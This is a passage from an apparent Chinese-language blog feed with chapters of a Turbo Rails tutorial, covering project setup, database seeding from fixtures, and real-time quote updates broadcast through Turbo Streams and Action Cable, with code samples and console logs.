    <span class="token variable">@quote</span> <span class="token operator">=</span> <span class="token class-name">Quote</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>save
      redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span>
    <span class="token keyword">else</span>
      <span class="token comment"># Add `status: :unprocessable_entity` here</span>
      render <span class="token symbol">:new</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token comment"># ...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">update</span></span>
    <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>
      redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully updated."</span></span>
    <span class="token keyword">else</span>
      <span class="token comment"># Add `status: :unprocessable_entity` here</span>
      render <span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token comment"># ...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在，我们增删改查就都OK了，就是页面太丑了，下一章我们将添加CSS样式。</p>
<h3 id="Seeding"><a href="#Seeding" class="headerlink" title="Seeding"></a>Seeding</h3><p>当我们第一次打开项目时，也没有数据，每次手动添加又太麻烦，我们知道可以通过<code>db/seeds.rb</code>来初始化数据，不过既然我们已经在<code>fixtures</code>中定义了数据了，就可以利用这一部分。</p>
<ul>
<li>使用seed数据：<code>bin/rails db:seed</code></li>
<li>使用fixture数据：<code>bin/rails db:fixtures:load</code></li>
</ul>
<p>不过我们也可以修改seeds.rb文件：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">puts <span class="token string-literal"><span class="token string">"\n== Seeding the database with fixtures =="</span></span>
system<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"bin/rails db:fixtures:load"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这样再执行：<code>bin/rails db:seed</code>时，就自动加载fixtures文件内容</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第一章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E4%B8%80%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<p>我们将学习使用，Rails7默认引入的<code>tubo-rails</code>库，并创建一个响应式的单页面应用，而无需编写任何自定义JavaScript代码。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>这一章我们将解释要学习的内容，看下成品的样子，并且开始我们的项目。</p>
</blockquote>
<p>线上试用：<a href="https://www.hotrails.dev/quotes%EF%BC%8C%E7%B1%BB%E4%BC%BC%E4%BA%8E%E4%B8%80%E4%B8%AA%E8%B4%A6%E5%8D%95%E7%AE%A1%E7%90%86%E5%99%A8%EF%BC%8C%E4%BD%A0%E5%8F%AF%E4%BB%A5%E8%AF%95%E7%9D%80%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E7%BC%96%E8%BE%91%E3%80%82">https://www.hotrails.dev/quotes，类似于一个账单管理器，你可以试着添加数据，并进行编辑。</a></p>
<h3 id="为什么学习Turbo？"><a href="#为什么学习Turbo？" class="headerlink" title="为什么学习Turbo？"></a>为什么学习Turbo？</h3><p>伴随着2021年12月7日发布的Rails7，Hotwire整合了Stimulus和Turbo。成为了默认的前端框架。下面我们看看Turbo与Rails整合带来的新的特点：</p>
<ul>
<li>第一：所有的链接和表单提交转为Ajax请求，通过<code>Turbo Drive</code>可以加速我们的系统，我们只需要简单的引入，而不需要做其他操作，即可获得好处。</li>
<li>第二：通过<code>Turbo Frames</code>几行代码，我们就可以很容易的将页面切割为小的组件，可以替换或延迟加载页面的独立部分。</li>
<li>第三：通过<code>Turbo Stream</code>就可以增加实时更新的特点。你可以做类似的多用户游戏或者实时监控系统。</li>
</ul>
<p>通过本次教程的学习，你将知道所有的细节关于上面三点。</p>
<h3 id="本教程适用范围"><a href="#本教程适用范围" class="headerlink" title="本教程适用范围"></a>本教程适用范围</h3><p>本教程中你将：</p>
<ul>
<li>创建一个增删改查项目</li>
<li>创建我们的CSS样式系统</li>
<li>通过<code>Devise gem</code>进行身份校验</li>
<li>学习：<code>Turbo Drive, Turbo Frames, Turbo Streams</code></li>
</ul>
<p>如果你已经很熟悉1-3点，并打算学习第四点，那本教程就适用于你。</p>
<h3 id="项目开始"><a href="#项目开始" class="headerlink" title="项目开始"></a>项目开始</h3><p>我们将开始创建新的Rails项目，其中使用Sass作为css预处理器，Esbuild来构建Js。数据库你随意。这里默认你是Rails7版本</p>
<ul>
<li>开始创建：</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rails new quote-editor <span class="token parameter variable">--css</span><span class="token operator">=</span>sass <span class="token parameter variable">--javascript</span><span class="token operator">=</span>esbuild <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>检查你的Gemfile看是否有该依赖</li>
</ul>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># Gemfile</span>
gem <span class="token string-literal"><span class="token string">"turbo-rails"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"~> 1.0"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>使用：<code>bundle install</code>下载正确版本的gem</li>
<li>使用：<code>bin/setup</code>来下载依赖，并创建数据库</li>
<li>使用：<code>bin/dev</code>来预编译css和js，并启动服务</li>
</ul>
<p>查看：<code>http://localhost:3000</code>，你应该能看到Rails启动页面。</p>
<hr>
<p><strong>注意：</strong><code>**bin/setup**</code> <strong>和</strong> <code>**bin/dev**</code></p>
<p><code>**bin/setup**</code> 可以下载gem，javascript依赖，create，migrate，seed 数据库。这一点不论是在团队中，还是小项目中，都可以快速的初始化环境。</p>
<p><code>**bin/dev**</code>基于<code>Procfile.dev</code>文件，当运行这个命令时，我们是在同时运行它们：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">web: bin/rails server <span class="token parameter variable">-p</span> <span class="token number">3000</span>
js: <span class="token function">yarn</span> build <span class="token parameter variable">--watch</span>
css: <span class="token function">yarn</span> build:css <span class="token parameter variable">--watch</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>第一个命令就是启动项目，第二，三个就是预编译，<code>--watch</code>是确保我们每次css，js文件被保存时，被观测到</p>
<p>这些命令都在创建项目的<code>/bin</code>目录中。</p>
<p>让我们继续构建项目吧</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第五章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E4%BA%94%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<h1 id="Real-time-updates-with-Turbo-Streams"><a href="#Real-time-updates-with-Turbo-Streams" class="headerlink" title="Real-time updates with Turbo Streams"></a>Real-time updates with Turbo Streams</h1><p>本章节，我们将学习如何使用Action Cable 广播 Turbo Stream templates，来让我们的页面进行实时跟新。</p>
<p>Turbo Stream format 可以仅用几行代码就与 Action Cable结合，来让我们的页面实时更新，当然与：群聊，通知，邮箱服务是类似的。</p>
<p>让我们用邮箱服务来举例，比如当我们收到一封新的邮箱，我们不想去手动的刷新让它显示，相反我们希望它能自己在页面上更新，而不需要我们操作什么。</p>
<p>而实现这一功能对于Rails来说很容易，因为在Rails5时就发布了Active Cable。本章将要讨论的Turbo Rails的一部分是建立在Action Cable之上的，而实现该功能，也就更加简单了。</p>
<h2 id="我们要做什么"><a href="#我们要做什么" class="headerlink" title="我们要做什么"></a>我们要做什么</h2><p>来想象一下，如果有许多人同时使用我们的quote编辑器，他们更希望实时看到同事们都写了什么。</p>
<p>在<code>Quotes#index</code>页面：</p>
<ul>
<li>任何时候一个成员创建了新的quote，我们希望该quote立刻被加到我们的quotes列表的最上面</li>
<li>任何时候一个成员修改了一个quote，我们希望修改的内容，能立刻显示在页面上</li>
<li>任何时候一个成员删除了一个quote，我们希望被删除的内容，能立刻消失</li>
</ul>
<p>这听起来很麻烦。但这个需求可以让我们的学习如何使用Turbo Stream来在首页中实时的更新，</p>
<h2 id="使用Turbo-Stream广播新建的quotes"><a href="#使用Turbo-Stream广播新建的quotes" class="headerlink" title="使用Turbo Stream广播新建的quotes"></a>使用Turbo Stream广播新建的quotes</h2><p>为了做到这一点，我们必须告诉<code>Quote</code>模型去广播新建的quote的HTML在创建后，让我们来改改</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  after_create_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_prepend_to <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token symbol">partial</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"quotes/quote"</span></span><span class="token punctuation">,</span> <span class="token symbol">locals</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token keyword">self</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token symbol">target</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>让我们先写下这些代码，当我们在浏览器中感受一下，就能更清晰的知道代码的含义了</p>
<p>首先，我们使用了<code>after_create_commit</code>回调去通知Rails，在每次向数据库内新加一条数据时，执行这个lambda表达式</p>
<p>第二段lanbda表达式中的代码就更复杂了，它会通知rails，新建的quote对应的HTML应该被广播到那些订阅了<code>quotes stream</code>的用户那里，并在DOM中放到id为<code>quotes</code>的节点前面</p>
<p>我们将会解释到底该怎么做，但现在我们应注意生成的HTML是什么样子的。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-stream</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>prepend<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quotes<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-frame</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>quote_123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token comment">&lt;!-- The HTML for the quote partial --></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-frame</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-stream</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有没有感觉这个代码很眼熟，和我们上一节中<code>QutoesController#create</code>将新创建的数据放到quotes列表的前面，所生成的HTML代码是一样的。</p>
<p><strong>唯一不同的是，这次的HTML是通过WebSocket传递的，而不是通过ajax的响应</strong></p>
<hr>
<p><strong>注意：</strong>这里的例子我们是将新加的数据放到最前面，我们当然也可以使用<code>broadcast_append_to</code>去把新加的数据，放到列表的后面</p>
<hr>
<p>为了能够订阅到<code>quotes</code>流，我们需要在<code>Quotes#index</code>中加入下面的代码</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/quotes/index.html.erb %>

&lt;%= turbo_stream_from "quotes" %>

&lt;%#</span></span> All the previous <span class="token constant">HTML</span> markup <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而这段代码生成的HTML是这样子的：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-cable-stream-source</span>
  <span class="token attr-name">channel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Turbo::StreamsChannel<span class="token punctuation">"</span></span>
  <span class="token attr-name">signed-stream-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>very-long-string<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-cable-stream-source</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到生成了一段来源于Turbo JavaScript Library的自定义标签，用订阅用户到在channel属性中命名的通道，更具体地说，是在signed-stream-name属性中命名的流。</p>
<p><code>Turbo::StreamsChannel</code>里面的<code>channel</code>参数名就是Action Cable channel 的名字，Turbo Rails总会使用这个channel，所以这个参数名始终是一样的。</p>
<p><code>signed-stream-name</code>参数是使用<code>quotes</code>的一个签名，它是为了防止一些恶意用户干预并从流中获取我们的HTML。这个我们会在下一章中细讲，现在你只需要知道这个长的字符串，解码后就<code>quotes</code></p>
<p>现在所有的<code>Quotes#index</code>页面中的用户都能监听到这个<code>Turbo::StreamsChannel</code>，并等待<code>quotes</code>流中的订阅数据，每当给数据库添加一个新的数据时，这些用户将收到<code>Turbo Stream format</code>中的HTML，并把数据放到相应的位置。</p>
<p>现在让我们看看是不是像我们预想的一样，下面会介绍两种方式去测试我们的代码</p>
<h2 id="Testing-Turbo-Streams-in-the-console"><a href="#Testing-Turbo-Streams-in-the-console" class="headerlink" title="Testing Turbo Streams in the console"></a>Testing Turbo Streams in the console</h2><p><strong>本章中，每次我们对<code>Quote</code>模型做修改时，我们都需要重启rails console在测试之前，否则会出现些意料之外的事儿</strong></p>
<hr>
<p><strong>注意：</strong>我们在console中测试前，需要确保Redis被正确的配置在应用中。</p>
<p>在开发环境，你的<code>config/cable.yml</code>应该长下面的样子：</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># config/cable.yml</span>

<span class="token key atrule">development</span><span class="token punctuation">:</span>
  <span class="token key atrule">adapter</span><span class="token punctuation">:</span> redis
  <span class="token key atrule">url</span><span class="token punctuation">:</span> redis<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>6379/1

<span class="token comment"># All the rest of the file</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果情况一致，那你可以忽略下面的提示了。</p>
<hr>
<p>否则，你应该下载Redis，然后运行：<code>bin/rails turbo:install</code>，它会修改<code>config/cable.yml</code>文件中的配置，如果没问题了，就可以继续往下了</p>
<hr>
<p>现在我们在浏览器中，打开<code>Quotes#index</code>页面，然后在rails console中创建一个新的quote：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Quote.create<span class="token operator">!</span><span class="token punctuation">(</span>name: <span class="token string">"Broadcasted quote"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然我们在console logs中看看发生了什么？第一件事儿：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TRANSACTION <span class="token punctuation">(</span><span class="token number">0</span>.1ms<span class="token punctuation">)</span>  begin transaction
Quote Create <span class="token punctuation">(</span><span class="token number">0</span>.4ms<span class="token punctuation">)</span>  INSERT INTO <span class="token string">"quotes"</span> <span class="token punctuation">(</span><span class="token string">"name"</span>, <span class="token string">"created_at"</span>, <span class="token string">"updated_at"</span><span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span>?, ?, ?<span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"name"</span>, <span class="token string">"Broadcasted quote"</span><span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token string">"created_at"</span>, <span class="token string">"2021-10-16 12:03:54.401034"</span><span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token string">"updated_at"</span>, <span class="token string">"2021-10-16 12:03:54.401034"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
TRANSACTION <span class="token punctuation">(</span><span class="token number">0</span>.8ms<span class="token punctuation">)</span>  commit transaction<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到，插入一条新的数据，然后事务提交，再往下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Rendered quotes/_quote.html.erb <span class="token punctuation">(</span>Duration: <span class="token number">0</span>.5ms <span class="token operator">|</span> Allocations: <span class="token number">285</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>ActionCable<span class="token punctuation">]</span> Broadcasting to quotes: <span class="token string">"&lt;turbo-stream action=<span class="token entity" title="\&quot;">\"</span>prepend<span class="token entity" title="\&quot;">\"</span> target=<span class="token entity" title="\&quot;">\"</span>quotes<span class="token entity" title="\&quot;">\"</span>>&lt;template>&lt;turbo-frame id=<span class="token entity" title="\&quot;">\"</span>quote_908005754<span class="token entity" title="\&quot;">\"</span>><span class="token entity" title="\n">\n</span>The HTML of our quotes/_quote.html.erb partial&lt;/turbo-frame>&lt;/template>&lt;/turbo-stream>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>内容很长，但确实很有趣的一部分</p>
<p>首先我们注意到，通过<code>ActionCable</code>广播了一段HTML到名字为<code>quotes</code>的流中，由于我们刚才在<code>Quotes#index</code>页面中加入了<code>turbo_stream_from &#39;quotes&#39;</code>，所以我们可以订阅到Stream，并获取到它广播通知的HTML</p>
<p>其次我们注意到，被广播通知的HTML是在Turbo Stream format中，它会通知Turbo去将<template>中的内容放到<code>quotes</code>的前面，这不这是我们让模型去做的事儿吗？</p>
<p>最后我们看到了生成的<template>中的HTML正是<code>quotes/_quote.html.erb</code>的数据，并且是我们刚刚创建的数据，当Turbo 在前端获取到模版时，它就会放到id为quotes中DOM节点前面。</p>
<p>我们画个草图来说明一下，现在的<code>Quotes#index</code>页面长下面的样子：</p>
<p><img src="../../../../public/img/image-20230607225702833.png" alt="image-20230607225702833"></p>
<p>想象一下，一个同事新创建了一条数据</p>
<p>由于<code>after_create_commit</code>的回调，当新创建数据后，<code>broadcasts_prepend_to</code>方法将被调用</p>
<p><img src="../../../../public/img/image-20230607225938559.png" alt="image-20230607225938559"></p>
<p>而在浏览器中，我们应该可以看到命名为“Broadcasted quote”已经被实时的加到列表的前面</p>
<p><img src="../../../../public/img/image-20230607230050674.png" alt="image-20230607230050674"></p>
<p>由于构建于Action Cable之上的Turbo Rails，这些修改都能被立刻的显示在页面中，我们不再需要刷新页面，我们仅仅使用了几行代码就让我们的系统具有了实时性的特点。</p>
<h2 id="Testing-Turbo-Streams-with-two-browser-windows"><a href="#Testing-Turbo-Streams-with-two-browser-windows" class="headerlink" title="Testing Turbo Streams with two browser windows"></a>Testing Turbo Streams with two browser windows</h2><p>另一种方式就是，使用浏览器打开两个页面，一个页面进项操作，看另外一个页面是否可以实时更新。</p>
<h2 id="Turbo-Streams-conventions-and-syntactic-sugar"><a href="#Turbo-Streams-conventions-and-syntactic-sugar" class="headerlink" title="Turbo Streams conventions and syntactic sugar"></a>Turbo Streams conventions and syntactic sugar</h2><p>让我们来简化一下先前在<code>Quote</code>模型中的操作</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  after_create_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_prepend_to <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token symbol">partial</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"quotes/quote"</span></span><span class="token punctuation">,</span> <span class="token symbol">locals</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token keyword">self</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token symbol">target</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的代码中，我们指定了<code>target: &quot;quotes&quot;</code>，而默认的target就是模型的复数形式，也就相当于我们这里的quotes，所以根据约定，target这部分我们可以省略</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  after_create_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_prepend_to <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">,</span> <span class="token symbol">partial</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"quotes/quote"</span></span><span class="token punctuation">,</span> <span class="token symbol">locals</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">quote</span><span class="token operator">:</span> <span class="token keyword">self</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还有两个约定，可以缩减我们的代码，底层中，<code>partial and locals</code>选项都有默认的值</p>
<p><code>partial</code>的默认值等于 model示例调用<code>to_partial_path</code>，对于<code>Quote</code>模型，就相当于<code>quotes/quote</code>。</p>
<p><code>locals</code>默认值等于<code>&#123; model_name.element.to_sym =&gt; self &#125;</code>,对于<code>Quote</code>模型，就相当于<code>&#123;quote:self&#125;</code>。</p>
<p>所以最终我们的代码被简化为下面的样子：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  after_create_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_prepend_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>根据约定大于配置，我们的代码只需要几行代码就可以完成任务了。</p>
<p>现在我们已经知道了Turbo Streams是如何运转的，让我们直接改进我们的增删改查代码。</p>
<h2 id="Broadcasting-quote-updates-with-Turbo-Streams"><a href="#Broadcasting-quote-updates-with-Turbo-Streams" class="headerlink" title="Broadcasting quote updates with Turbo Streams"></a>Broadcasting quote updates with Turbo Streams</h2><p>增加的效果已经出来了，现在我们让修改也生效</p>
<p>修改模型：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  after_create_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_prepend_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
  after_update_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_replace_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果你去浏览器或者控制台测试，会发现功能已经做完了。</p>
<p>让我们在rails console测试一下，并解释一下发生了什么</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Quote.first.update<span class="token operator">!</span><span class="token punctuation">(</span>name: <span class="token string">"Update from console"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Quote Load <span class="token punctuation">(</span><span class="token number">0</span>.3ms<span class="token punctuation">)</span>  SELECT <span class="token string">"quotes"</span>.* FROM <span class="token string">"quotes"</span> ORDER BY <span class="token string">"quotes"</span><span class="token builtin class-name">.</span><span class="token string">"id"</span> ASC LIMIT ?  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"LIMIT"</span>, <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
TRANSACTION <span class="token punctuation">(</span><span class="token number">0</span>.0ms<span class="token punctuation">)</span>  begin transaction
Quote Update <span class="token punctuation">(</span><span class="token number">0</span>.3ms<span class="token punctuation">)</span>  UPDATE <span class="token string">"quotes"</span> SET <span class="token string">"name"</span> <span class="token operator">=</span> ?, <span class="token string">"updated_at"</span> <span class="token operator">=</span> ? WHERE <span class="token string">"quotes"</span><span class="token builtin class-name">.</span><span class="token string">"id"</span> <span class="token operator">=</span> ?  <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"name"</span>, <span class="token string">"Update from console"</span><span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token string">"updated_at"</span>, <span class="token string">"2021-10-16 12:48:02.987708"</span><span class="token punctuation">]</span>, <span class="token punctuation">[</span><span class="token string">"id"</span>, <span class="token number">908005754</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
TRANSACTION <span class="token punctuation">(</span><span class="token number">1</span>.6ms<span class="token punctuation">)</span>  commit transaction<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到还是修改数据库，然后提交事务，当事务提交完毕后，<code>Quote</code>模型的 <code>after_update_commit</code>回调被触发，并且调用<code>broadcast_replace_to</code>方法</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Rendered quotes/_quote.html.erb <span class="token punctuation">(</span>Duration: <span class="token number">0</span>.6ms <span class="token operator">|</span> Allocations: <span class="token number">285</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>ActionCable<span class="token punctuation">]</span> Broadcasting to quotes: <span class="token string">"&lt;turbo-stream action=<span class="token entity" title="\&quot;">\"</span>replace<span class="token entity" title="\&quot;">\"</span> target=<span class="token entity" title="\&quot;">\"</span>quote_908005754<span class="token entity" title="\&quot;">\"</span>>&lt;template>&lt;turbo-frame id=<span class="token entity" title="\&quot;">\"</span>quote_908005754<span class="token entity" title="\&quot;">\"</span>><span class="token entity" title="\n">\n</span>HTML from the quotes/quote partial&lt;/turbo-frame>&lt;/template>&lt;/turbo-stream>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>像上次一样，我们看到了<code>quotes/quote</code>局部页面的HTML被广播到<code>quotes</code>流中，与上次不同，这次是<code>replace</code>而不是<code>prepend</code>，目标的DOM节点是id=quote_908005754的quote card，而它也就是要被更新的内容。</p>
<p><img src="../../../../public/img/image-20230608104009149.png" alt="image-20230608104009149"></p>
<p>而Turbo拦截被获取的HTML，并替换这个quote</p>
<p><img src="../../../../public/img/image-20230608104049888.png" alt="image-20230608104049888"></p>
<p>下面我们就来实现，如何实时的删除数据</p>
<h2 id="Broadcasting-quote-deletion-with-Turbo-Streams"><a href="#Broadcasting-quote-deletion-with-Turbo-Streams" class="headerlink" title="Broadcasting quote deletion with Turbo Streams"></a>Broadcasting quote deletion with Turbo Streams</h2><p>修改模型：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  after_create_commit <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> broadcast_prepend_to <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span>
